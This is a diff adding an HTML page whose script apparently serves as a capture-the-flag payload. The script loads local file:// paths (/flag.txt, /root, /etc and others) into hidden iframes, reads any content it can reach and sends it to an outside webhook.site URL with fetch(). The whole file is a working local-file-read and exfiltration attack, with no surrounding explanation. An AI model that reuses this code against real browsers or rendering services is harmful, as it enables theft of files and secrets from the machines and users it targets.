@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<script>
+const webhook = 'https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/';
+
+// List of possible flag locations
+const flagPaths = [
+    'file:///flag.txt',
+    'file:///home/user/flag.txt',
+    'file:///tmp/flag.txt',
+    'file:///app/flag.txt',
+    'file:///var/flag.txt',
+    'file:///etc/flag.txt',
+    'file:///root/flag.txt',
+    'file:///home/node/flag.txt'
+];
+
+function tryPath(path, index) {
+    const iframe = document.createElement('iframe');
+    iframe.src = path;
+    iframe.style.display = 'none';
+    
+    iframe.onload = function() {
+        try {
+            const content = iframe.contentDocument.body.innerText || iframe.contentDocument.body.textContent;
+            if (content && content.trim()) {
+                fetch(webhook + '?found_at=' + encodeURIComponent(path) + '&flag=' + encodeURIComponent(content));
+            }
+        } catch (e) {
+            // Silent fail, try next
+        }
+    };
+    
+    iframe.onerror = function() {
+        // Silent fail, try next
+    };
+    
+    document.body.appendChild(iframe);
+    
+    // Try next path after delay
+    if (index < flagPaths.length - 1) {
+        setTimeout(() => tryPath(flagPaths[index + 1], index + 1), 500);
+    }
+}
+
+// Start trying paths
+setTimeout(() => {
+    fetch(webhook + '?status=starting_path_enumeration');
+    tryPath(flagPaths[0], 0);
+}, 500);
+</script>
+<body>
+<p>Path enumeration...</p>
+</body>
+</html>
